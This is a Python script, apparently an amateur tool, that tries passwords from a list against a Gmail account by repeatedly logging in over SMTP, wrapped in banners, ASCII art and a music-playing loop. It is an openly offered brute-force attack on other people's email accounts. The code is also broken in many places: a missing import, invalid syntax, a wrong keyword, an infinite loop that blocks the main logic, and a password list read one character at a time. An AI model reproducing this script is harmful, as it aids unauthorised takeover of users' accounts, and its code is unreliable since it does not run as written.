import smtplib
import time
import subprocess
from datetime import datetime

r = "033[1;91m"
g = "033[1;32m"
s = g + "+"
print (g +'-'*60)
print ("")
print ('['+s+']starting your tool and updating the programm')
print ("")
print (g +'-'*60)
time.sleep(5)

print (g'/...\.....starting the server' + g +'/....//../'*1000)
subprocess.call('clear',SHELL=True)
while True:
    print ('play song for more motivation!......')
    subprocess.call("play-audio 'Eminem_-_Escape_feat._Hopsin_(2019)(360p).mp3'",SHELL=True)

print ('now let-us start.....')

def usage():
    print ('USAGE: python gmail.py <GMAIL> <PASSLIST>')

      
    print ('  {{{{{                              }}}}} ')
    print (' {{{{                                  }}}} ')
    print (' {{{{   NNNNNNNN    NNNN HHHH   HHHH   }}}} ')
    print (' {{{{   NNNNNNNNN   NNNN HHHH   HHHH   }}}}  ')
    print ('{{{{    NNNNN NNNN  NNNN HHHHHHHHHHH    }}}} ')
    print (' {{{{   NNNNN  NNNN NNNN HHHHHHHHHHH   }}}} ')
    print (' {{{{   NNNNN   NNNNNNNN HHHH   HHHH   }}}} ')
    print (' {{{{{  NNNNN    NNNNNNN HHHH   HHHH   }}}} ')
    print ('  {{{{{{                             }}}}} ')

target = str(sys.argv[1])
passw = str(sys.argv[2])
s = smtplib.SMTP('smtp.gmail.com',587)

def start():
   for password in passw: 
     try:
        passww = s.login(target,password)
        t1 = datetime.now()
        print ('started at:{0}'.format(t1))
        print ('[+]password Found:%s'%passww)
     except:
        print ('[-]Attempting password:%s'%password)
print (len(sys.argv))
if len(sys.argv) != 3:
    usage()
else:
    start()
t2 = datetime.now()
total = t2 - t1
print ('finished in :{0}'.format(total))

